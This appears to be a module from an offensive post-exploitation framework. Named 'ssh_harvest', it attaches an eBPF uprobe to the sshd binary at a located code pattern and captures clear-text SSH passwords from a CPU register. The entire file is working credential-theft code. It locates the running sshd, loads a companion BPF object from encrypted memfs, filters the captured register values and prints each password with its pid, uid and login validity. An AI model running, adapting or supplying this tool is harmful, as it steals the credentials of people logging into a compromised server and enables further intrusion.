# ssh_harvest - capture clear-text SSH credentials with an eBPF uprobe.
#
# Drop-in replacement for the old ptrace-based `ssh_harvester` Go module. The
# original attached ptrace, scanned the sshd text segment for a code pattern,
# patched an INT3, and read a register at the trap. This version does the same
# job without touching the traced process at all:
#
#   1. locate the code pattern in the on-disk sshd image (ebpf_code_offset),
#   2. attach an in-memory eBPF uprobe at that file offset
#      (ebpf_uprobe_capture),
#   3. drain the events map and report the credential-bearing register.
#
# The password register and the code pattern keep their classic defaults, so a
# plain `ssh_harvest` invocation behaves like the old module. The BPF object
# (probe.bpf.o) is a companion file built by `make`; the loader caches it in
# encrypted memfs and exposes it through the `module_files` global.

# Default code pattern (hex bytes in memory order) that marks where sshd
# leaves the PAM authentication result in RAX and the password in a register.
# This is the same byte sequence the ptrace harvester used: add rsp, 8;
# movzx eax, al; ...
DEFAULT_PATTERN = "4883c4080fb6c021"

# Register -> password mapping. The order must match libbpf.ArgRegisters and
# the register array in probe.bpf.c, but the Go builtin re-validates the name,
# so this list only powers the early, script-side rejection of bad input.
REGISTERS = [
    "RAX",
    "RDI",
    "RSI",
    "RDX",
    "RCX",
    "R8",
    "R9",
    "RBP",
    "RSP",
    "RBX",
    "R12",
    "R13",
    "R14",
    "R15",
]

DEFAULT_REGISTER = "RSI"
DEFAULT_PATH = "/usr/sbin/sshd"


def _is_known_register(reg):
    for known in REGISTERS:
        if known == reg:
            return True
    return False


def _is_pid(name):
    if not name:
        return False
    c = name[0]
    return c >= "0" and c <= "9"


def _find_sshd_exe():
    # The ptrace harvester resolved the sshd image from the running process,
    # so a non-standard install path kept working. Prefer a live sshd's
    # /proc/<pid>/exe, stripping the "(deleted)" marker a replaced binary
    # leaves behind.
    for pid in list_dir("/proc"):
        if not _is_pid(pid):
            continue
        comm = read_file(sprintf("/proc/%s/comm", pid), default="").strip()
        if not _is_sshd(comm):
            continue
        exe = read_link(sprintf("/proc/%s/exe", pid), default="").strip()
        if exe.endswith(" (deleted)"):
            exe = exe[: -len(" (deleted)")]
        if exe and exists(exe):
            return exe
    return ""


def _find_bpf_image():
    # The companion object is uploaded into encrypted memfs by the module
    # loader. Prefer the canonical name, then fall back to any ELF object so a
    # renamed companion still works.
    for path in module_files:
        if path.endswith("probe.bpf.o"):
            return read_file(path)
    for path in module_files:
        if path.endswith(".bpf.o") or path.endswith(".o"):
            return read_file(path)
    return None


def _is_printable(value):
    # Reject control bytes and non-ASCII so a binary blob in the register is
    # never reported as a password. Starlark strings are byte strings, so
    # indexing yields a one-byte string and ord() gives its value.
    if not value:
        return False
    for i in range(len(value)):
        c = ord(value[i])
        if c < 0x20 or c > 0x7E:
            return False
    return True


def _is_sshd(comm):
    return str_contains(str_lower(comm), "sshd")


def _collect_credentials(events):
    # Keep the first occurrence of each distinct password. A login attempt can
    # hit several breakpoints/events before the map is drained, and the old
    # module deduplicated the same way.
    seen = {}
    creds = []
    for ev in events:
        comm = ev["comm"]
        arg = ev["arg"]
        if not _is_sshd(comm):
            continue
        if not _is_printable(arg):
            continue
        if arg in seen:
            continue
        seen[arg] = True
        creds.append(ev)
    return creds


def _report(creds):
    for ev in creds:
        valid = "yes" if ev["retval"] != 0 else "no"
        print(
            sprintf(
                "[+] pid=%d uid=%d comm=%q valid=%s password=%q",
                ev["pid"],
                ev["uid"],
                ev["comm"],
                valid,
                ev["arg"],
            )
        )
    print(sprintf("[*] %d credential(s) captured", len(creds)))


def main(*args):
    if not (has_cap("CAP_BPF") or has_cap("CAP_SYS_ADMIN")):
        print(
            "[!] missing CAP_BPF/CAP_SYS_ADMIN; eBPF uprobe capture requires one of them"
        )
        return "ERROR: CAP_BPF required"

    reg = args[0].strip() if len(args) > 0 and args[0] else DEFAULT_REGISTER
    reg = str_upper(reg)
    if not _is_known_register(reg):
        print(
            sprintf(
                "[!] unknown register %s (expected one of %s)",
                reg,
                str_join(REGISTERS, ", "),
            )
        )
        return "ERROR: unknown register"

    pattern = args[1].strip() if len(args) > 1 and args[1] else DEFAULT_PATTERN
    timeout_s = 10
    if len(args) > 2 and args[2]:
        timeout_s = int(args[2])
        if timeout_s < 0:
            print("[!] timeout must not be negative")
            return "ERROR: invalid timeout"

    path = args[3].strip() if len(args) > 3 and args[3] else ""
    if not path or not exists(path):
        found = _find_sshd_exe()
        if found:
            path = found
    if not path:
        path = DEFAULT_PATH
    pid = -1
    if len(args) > 4 and args[4]:
        pid = int(args[4])

    image = _find_bpf_image()
    if image == None:
        print(
            "[!] no BPF object found in module_files (is module_files_memfs enabled?)"
        )
        return "ERROR: missing BPF object"

    located = ebpf_code_offset(path, pattern)
    if located["error"]:
        print(
            sprintf(
                "[!] locating pattern %s in %s: %s", pattern, path, located["error"]
            )
        )
        return "ERROR: code pattern not found"
    offset = located["offset"]
    print(
        sprintf(
            "[*] probing %s at file offset %s (vaddr %s), register %s, pid %d",
            path,
            hex(offset),
            hex(located["vaddr"]),
            reg,
            pid,
        )
    )

    captured = ebpf_uprobe_capture(
        image=image,
        path=path,
        offset=offset,
        prog="probe",
        reg=reg,
        pid=pid,
        timeout_ms=timeout_s * 1000,
    )
    if captured["error"]:
        print(sprintf("[!] uprobe capture: %s", captured["error"]))
        return "ERROR: capture failed"

    creds = _collect_credentials(captured["events"])
    _report(creds)
    return "OK"
